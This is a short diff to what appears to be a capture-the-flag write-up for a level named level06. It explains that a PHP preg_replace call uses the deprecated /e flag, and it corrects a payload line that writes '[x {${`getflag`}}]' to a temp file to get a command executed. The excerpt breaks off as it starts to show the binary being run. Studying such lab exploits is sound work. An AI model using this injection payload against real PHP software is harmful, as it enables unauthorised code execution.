@@ -25,7 +25,7 @@ $r = x($argv[1], $argv[2]); print $r;
 We can see in the 3rd call to `preg_replace`  the deprecated flag `/e`.
 
 Let's start by creating our file:
-``echo '[x {${`getflag`}}' > /tmp/chopperledrapeau``
+``echo '[x {${`getflag`}}]' > /tmp/chopperledrapeau``
 
 Now we just need to run `./level06` with `/tmp/chopperledrapeau` as an argument:
 ```
